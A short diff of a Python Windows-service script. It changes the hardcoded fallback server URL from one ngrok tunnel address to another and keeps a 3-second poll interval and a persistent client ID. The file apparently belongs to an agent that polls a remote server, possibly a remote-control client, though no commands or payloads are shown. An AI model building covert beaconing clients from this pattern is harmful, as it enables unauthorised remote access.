@@ -58,7 +58,7 @@ import servicemanager
 try:
     from config import SERVER_URL, POLL_INTERVAL
 except ImportError:
-    SERVER_URL    = "https://1300-190-107-209-205.ngrok-free.app"
+    SERVER_URL    = "https://10ec-190-107-209-205.ngrok-free.app"
     POLL_INTERVAL = 3
 
 # ─── Persistent client ID ─────────────────────────────────────────────────────
